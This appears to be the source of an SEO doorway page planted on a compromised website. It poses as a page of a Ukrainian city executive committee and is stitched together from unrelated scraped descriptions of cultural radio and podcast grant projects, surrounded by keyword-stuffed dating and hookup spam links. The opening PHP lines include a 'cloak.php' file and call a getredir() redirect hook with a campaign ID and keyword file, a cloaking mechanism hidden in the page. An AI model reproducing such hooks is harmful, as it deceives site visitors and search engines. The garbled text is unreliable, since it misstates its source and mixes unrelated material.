<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b2%d0%b8%d0%ba%d0%be%d0%bd%d0%b0%d0%b2%d1%87%d1%96+%d0%bf%d0%be%d0%b1%d0%b0%d1%87%d0%b5%d0%bd%d0%bd%d1%8f+%d0%a2%d0%b0%d0%b2%d1%80%d1%96%d0%b9%d1%81%d1%8c%d0%ba+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>ВИКОНАВЧИЙ КОМІТЕТ ТАВРІЙСЬКОЇ МІСЬКОЇ РАДИ</title>
	<meta name="description" content="ВИКОНАВЧИЙ КОМІТЕТ ТАВРІЙСЬКОЇ МІСЬКОЇ РАДИ. Адреса. Україна, , Херсонська обл., місто Нова Каховка, місто Таврійськ, ВУЛИЦЯ ІВАНА​." />
	<link rel="canonical" href="https://masage.od.ua/img/103/lug-vikonavch-pobachennya.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/422/bacaq-krash-onlayn-znayomstva.php">кращі онлайн знайомства в Вільнянськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/113/lu-znayomstva-msto-poblizu.php">знайомства місто поблизу Генічеськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/313/quxa-znayomstva-dlya-lyudey.php">знайомства для людей похилого віку Іллінці Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/313/xaby-mstsya-pdklyuchennya.php">місця підключення Червоноград Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Виконавчі побачення Таврійськ Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>

		
	<p>Проект надає змогу молодим та маловідомим українським виконавцям і виконавицям презентувати свою творчість широкій аудиторії. Впродовж 50 хвилин в прямому етері гості-музики і не музики, разом з ведучим, розкривають таємниці рок-музики, грають вживу та слухають музичні твори. Слухачі і слухачки можуть висловити у прямому етері ставлення до музики і до подій, що відбуваються в Україні і довкола. Проект передбачає виробництво прямоефірних радіопрограм, підготовку мультимедійних публікацій та подкастів для розміщення онлайн. Окремі програми супроводжуватимуться відеотрансляцією на Youtube та Facebook.</p>
<p>Full name of the organization: Благодійна організація "Благодійний фонд "Метод"".</p><strong><a id='p1'></a><h2>ВИКОНАВЧИЙ КОМІТЕТ ТАВРІЙСЬКОЇ МІСЬКОЇ РАДИ - - Opendatabot</h2></strong><p>Фокусується на створенні умов їхньої правової самоосвіти, на забезпечені інструментами для системної протидії порушенням прав, на врегулюванні трудових відносин у культурних процесах. Project name: Радіосеріал аудіосеріал "Містичні туристи". Cities of implementation: Україна, Світ користувачі Megogo Audio ,. Жанр — містичний детектив. Це історія фокусника, який в пошуках зниклої дівчини мусить мандрувати містичними місцями України.</p>
<p>Щоб знайти її та протистояти сильному ворогу герой збирає команду з дивних людей. Події відбуваються в х роках минулого століття. Це нагода показати зміни в Україні. Від технічно-побутових до політичних та ідеологічних. Project name: Свідоме життя. Full name of the organization: Товариство з обмеженою відповідальністю «Телерадіокомпанія «Радіо-Ера». Project description: Це буде серія просвітницьких програм за участі українських діячів культури та лідерів думок, які розповідають про соціальну відповідальність на власних прикладах та про свою участь у культурно-соціальних і благодійних акціях.</p>
<p>Мета: Розвиток українського аудіального продукту з фокусом на культурно-мистецький та соціальний контент.</p><a id='p2'></a><h3>Засідання N50</h3><p>Результати: 1 створено 25 радіопродуктів для ефірів Радіо НВ; 2 збільшена кількість україномовних передач та подкастів у вільному доступі шляхом додаткового розміщення ефірів на Youtube і Facebook та аудіозаписів на Soundcloud; 3 збільшено кількість аудиторії, яка слухає якісний український контент; 4 створена підтримка представникам культури у їх соціальній діяльності. Full name of the organization: Приватне підприємство "О. Project description: Проект передбачає наповнення ефіру єдиного, повністю україномовного, РокРадіо UA, щоденними програмами, які представляють собою цикли авторських пізнавальних розповідей, про історію та сучасність української рок музики, її стилі та напрямки, виконавців, концерти та фестивалі, а також інші грані української рок культури.</p>
<p>Крім того, програми густо насичені музичним контентом, бо саме мовою музики можна розповісти про будь що. Основна мета проекту це популяризація, через радіо, якісного україномовного рок продукту та залучення до цього як найбільшої аудиторії. Project name: Платформа сучасної української радіодрами. Project description: Створення на базі професійного й прогресивного театру під наглядом менторів-фахівців радіодрами якісного та сучасного аудіо-продукту у вигляді 6 готових радіо-п'єс у повній відповідності до формату радіодрами. Project name: Подкаст "Культура всього".</p>
<p>Full name of the organization: Фізична особа-підприємець Боборикін Андрій Ігорович. Проєкт передбачає публікацію кожного випуску у вигляді подкаста на всіх основних подкаст-директоріях iTunes, Soundcloud, Google Podcasts та на платформі подкастів онлайн-видання "Українська правда". Project name: Подкаст «Пост правди». Full name of the organization: Товариство з обмеженою відповідальністю «Журнал Куншт». Project description: Сезон наративного подкасту під назвою «Пост правди» про вміння виявляти дезінформацію, маніпуляції в медіа, псевдонауку та фейки.</p>
<p>Кожен епізод буде присвячений новому аспекту інформаційної грамотності.</p><strong><a id='p3'></a><h2>Program registery Audiovisual Arts</h2></strong><p>Усі проблеми висвітлюватимуться через реальні приклади та історії, залучаючи експертів зі сфер нейрофізіології, філософії, політології, культурології та журналістики. Особливість подкасту — в аудіоефектах та прийомі сторітелінгу, що зробить кожен епізод «театром для вух». В результаті буде створено 12 епізодів, які загально прослухають принаймні людей. Проект навчить основ медіаграмотності та перевірки інформації та в довгостроковій перспективі зменшить вразливість аудиторії до фейків та маніпуляцій. Project name: Cedra. Project description: Проект складається з трьох програм, по 10 серій у кожній, присвячених наступним темам: історіям видатних українців минулого, які досягли висот у своїй сфері діяльності; шедеврам українського мистецтва та вітчизняним митцям; творам української літератури, які обігнали свій час і є актуальними для сучасної України.</p>
<p>Подкасти створено з метою популяризації української історії та культури, та посилення укріплення тренду на вітчизняний аудіальний продукт у форматі інфотейменту. Результатом реалізації проекту буде створення аудіо-продукту здатного конкурувати з аналогічним закордонним продуктом за прихильність української аудиторії, та підвищення зацікавленості вітчизняним мистецтвом та укріплення усвідомлення того, що українська культурна спадщина не поступається іноземній.</p>
<p>Project name: «Радіопередача Біоритм» або як електронна музика привертає увагу до проблем навколишнього середовища. Більшість із нас забули, як звучить те саме незаймане чисте середовище. Проект «Біоритм» знайшов точку входу, де людина зможе знову почути ритм природи. Формат радіопередачі має мету застосувати первинний інструмент комунікації людей, один з шести уроджених сенсорів людини — слух. Багато слів написано та сказано про ті чи інші проблеми. А якщо без слів? Через сенсорику, як тварини, ми прагнемо донести глибині ідеї.</p>
<p>Радіопередачі з електронною музикою мають лише назву конкретної проблеми, а суть доносить саме звучання. Project name: Джазові рими. Project description: Радіовистава "Джазові рими" - це колаборація сучасних українських поетів та знаних джазових виконавців з різних регіонів України. Ця вистава — атмосферний діалог головного героя з митцями на важливі і актуальні для кожного теми.</p>
<p>Нове українське слово, підсилене джазовими синкопами має сягнути самої глибини душі і знайти відповіді на питання кохання і зради, війни та миру, життя та смерті. Мета проєкту — підтримка та розвиток українського джазового та літературного мистецтва у радіопросторі, популяризація сучасного українського контенту в Україні та за кордоном. Project name: "Дрімайко-сучасна українська казка". Full name of the organization: Приватне акціонерне товариство «Радіокомпанія Гала». Відомий український письменник казок Сашко Лірник створить свої шедеври для молодої україномовної аудиторії, іх батьків та дідусів та бабусь.</p>
<p>Project name: "Я, "Побєда" і Берлін" радіовистава. Project description: Наш проєкт - це комедійна радіовистава у форматі серіалу з 12 серій по 10 хв. Створення на оригінальному українському літературному матеріалі якісного життєствердного аудіоконтенту, здатного протидіяти інформаційній агресії, спрямованій, в тому числі, на формування комплексу меншовартості у наших співвітчизників, донесення цього контенту максимальній кількості слухачів — головна ціль нашого проєкту.</p>
<p>Гумор підтримував наших співгромадян у найтяжчі часи, тож в результаті нашого проєкту українцям буде легше опиратися інформаційній агресії. Project name: Роменщина тисячолітня цикл радіопередач. Full name of the organization: Міськрайонна радіостудія "Ромен". Project description: Мета проекту — відновлення забутих та ненаписаних сторінок історії Роменщини. Проект включає колекцію фотографій та розповідей про видатних особистостей, які зробили визначний внесок у розвиток різних сфер життєдіяльності суспільства.</p>
<p>Роменщина здавна відома як інтелектуальне та духовне джерело. Проект «Роменщина тисячолітня» буде реалізовуватися в форматі радіопередач. Які будуть виходити 3 рази на тиждень протягом 6 місяців. Цільова аудиторія є мешканці та гості міста Ромни, а також Роменського, Недригайлівського та Липоводолинського районів. Проект передбачає розробку та виготовлення інформаційних буклетів у кількості шт. Project name: Жива історія. Cities of implementation: Запорізька область,. Таким чином, усі охочі зможуть дізнатися про історію Запоріжжя та українську культуру.</p>
<p>Інформація буде представлена українською, російською та англійською мовами. Cities of implementation: Вся Україна, оскільки це медіапроєкт,. Project description: Мета проєкту — сприяти формуванню соціального тренду на гідність, партнерство і здорові стосунки; промотувати здорові рольові моделі та моделі здорових стосунків; прияти розвитку навичок і вмінь ненасильницького спілкування та побудови здорових стосунків; Запобігати та протидіяти різним видам насильства між людьми. Для цього буде створено цикл із 25 прямоефірних ток-шоу, в результаті якого слухачі отримають практичні знання та рекомендації щодо розвитку своїх персональних та соціальних навичок та вмінь будувати здорові стосунки.</p>
<p>Project name: 12 причин закохатися в Запоріжжя. Project description: Cерія радіопрограмм з інтригуючою назвою «12 причин закохатися у Запоріжжя». Це проект - розповідь про цікавинки культурного життя міста. У радіопрограмах буде подано свіжий сучасний погляд на життя Запорізької області та регіону.</p>
		
			<br><ol>
			
				<li>Історія змін зареєстрованих YouControl – 3?</li>
			
				<li>безкоштовні веб - сайти знайомств у Windows Жовті Води Україна!</li>
			
				<li>одна ніч підключення поблизу Ватутіне Україна;</li>
			
			</ol>
		
	<p>Буде наданий опис культурної спадщини та насиченності творчими талантами. Добірка програм розповість про творчі та ремісничі колективи, які поважні у всьому світу, але на жаль мало відомі у рідному місті. Після знайомства з їх творчістю, справді не можна не закохатися в Запоріжжя, де живуть та працюють такі талановиті люди. Таких героїв багато, але пересічні громадяни мало про них знають. Project name: Розробка туристичного маршруту із доповненою реальністю "Віднайди Підзамче". Multimedia Technologies.</p>
<p>Full name of the organization: Міський Палац культури імені Гната Хоткевича. Cities of implementation: Львів, Одеса,. Результатом проекту буде розроблений AR-додаток для трьох туристичних маршрутів проекту з вільним доступом для громади міста та туристів, а також розширення туристичного маршруту Львова за межі центру міста. Project name: Міжнародний фестиваль-конференція медіа-мистецтва "Art goes techno".</p>
		
			<br><ul>
			
				<li>автоматичне підключення Тростянець Україна.</li>
			
				<li>Навігаційне меню.</li>
			
				<li>місто міжрасових знайомств в Київ Україна;</li>
			
			</ol>
		
	<p>Full name of the organization: Громадська організація "Асоціація випускників, викладачів і друзів Харківського національного університету імені В. Cities of implementation: Харків, Харківська область,. Project description: Міжнародний фестиваль-конференція медіа-мистецтва демонструє новітні технології у сучасному мистецтві та знайомить глядача та професійну спільноту з прикладами сучасних міждисциплінарних арт-проєктів: імерсивними творами, VR та AR проєктами, нет-артом, мобільними аплікаціями, саунд- та інтерактивними інсталяціями з використанням контролерів руху.</p>
<p>Фестиваль складатиметься з трьох компонентів: 1 конкурсу студентських ідей імерсивного проекту, її втілення спільно зі спеціалістами та презентації; 2 основної програми фестивалю-конференції: стислі промови, лекції, панельні дискусії, мультимедійну виставку, воркшоп для дітей. Спікерами будуть запрошені художники, що працюють на межі мистецтва та нових технологій.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/406/kury-sayti-znayomstv-na.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/468/powi-znayomstva-lesbyanki.php">знайомства лесбіянки в Самбір Україна</a></li><li><a href="https://masage.od.ua/img/211/bowo-vitrati-na.php">витрати на сватання в Алушта Україна</a></li><li><a href="https://masage.od.ua/img/113/pisap-znayomstva-z.php">знайомства з хлопцями з Умань Україна</a></li><li><a href="https://masage.od.ua/img/422/dequ-okrugu-znayomstva.php">округу знайомства в Ясинувата Україна</a></li><li><a href="https://masage.od.ua/img/248/janol-sayt-znayomstv.php">сайт знайомств місто в Христинівка Україна</a></li><li><a href="https://masage.od.ua/img/113/cadi-znayomstva-dlya-doroslih.php">знайомства для дорослих одинаків Луцьк Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#p1'>ВИКОНАВЧИЙ КОМІТЕТ ТАВРІЙСЬКОЇ МІСЬКОЇ РАДИ - - Opendatabot</a></li>
<li><a href='#p2'>Засідання N50</a></li>
<li><a href='#p3'>Program registery Audiovisual Arts</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/468/damyv-bezkoshtovn-seks.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>